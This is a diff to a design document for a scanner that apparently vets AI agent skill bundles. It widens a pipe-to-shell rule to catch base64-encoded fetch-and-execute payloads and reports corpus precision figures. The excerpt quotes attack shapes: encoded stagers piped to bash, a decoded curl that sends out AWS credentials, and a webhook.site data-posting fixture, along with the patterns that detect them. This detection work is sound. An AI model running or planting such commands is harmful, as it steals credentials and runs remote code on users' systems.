@@ -1158,6 +1158,22 @@ The code had drifted behind its own spec, and four issue-#105 shapes were invisi
 - **Fixtures:** TP: `curl -d @- https://webhook.site/abc`. FP: link to `https://bit.ly/docs` in prose, POST to author's declared API.
 
 ### SG-NET-002 — Pipe-to-shell execution  (AST01, critical) — **T1, very high precision** — **implemented** (`core-network`)
+> **Decoded-blob widening (core-network 1.3.0, #118).** The fetch-exec shapes with the fetch hidden inside an encoded
+> literal: `eval $(echo "Y3VybC…" | base64 -d)` (Snyk *ToxicSkills*; decodes to a curl exfiltrating `~/.aws/credentials`)
+> and `echo '…' | base64 -D | bash` (the clawdhub campaign's macOS stager, in `SKILL.md`). Both scanned `pass` / 0
+> findings: the `eval $(curl` leaf needs a literal fetch verb, which is what the encoding removes, and `SG-EXE-001`'s
+> `eval\s*\(` needs the call form and never reads `SKILL.md` at all. Four leaves, all at 0.9, all **gated on a decoder**
+> (`base64 -d/-D/--decode`, `xxd -r`, `openssl base64|enc … -d`, `uudecode`): decoder piped to a shell; decoder piped to an
+> interpreter that reads stdin (the same `python -`/end-of-command tail as the fetch leaf, so `| python3 -m json.tool`
+> stays clean); `eval`/`sh -c`/`source`/`.` around a `$( … )` that decodes, windowed to the closing paren (300 chars —
+> the literal alone is 44+, and a 60-char window measured the real payload as a miss); and process substitution
+> `bash <( … base64 -d)`. **Never on the sink:** bare `eval "$(…)"` is the shell-init idiom (7 benign corpus hits).
+> Over 11,335 corpus files the decoder-gated shapes matched twice. A detector's own regex source (`'base64 -d \| bash'`)
+> is excluded by keeping `\` out of the decoder-to-pipe window. The other is `openclaw-skill-vetter/SKILL.md:262`,
+> quoting this attack as a REJECT example. It **emits at 0.65** (0.9 + 0.15 − 0.4 fenced), and that is deliberate:
+> the payloads this widening targets are fenced setup blocks too, so a fence penalty large enough to drop the example
+> would drop the attack. Its verdict was already `fail`. A/B over the 10 decoder-bearing bundles: that one +1, all others
+> unchanged. `TestPipeToShellCoversDecodedBlob` (10 TP, 7 benign, plus the fenced-body emission).
 > **Corpus precision audit + widening (core-network 1.2.0, #337).** This is the rule's first audit against the full
 > 1,036-bundle corpus (all seven sources): **69 findings / 27 bundles before, 48 / 23 after**. No other rule moved.
 > Three FP classes were removed, and leaves 1, 2 and 8 changed:
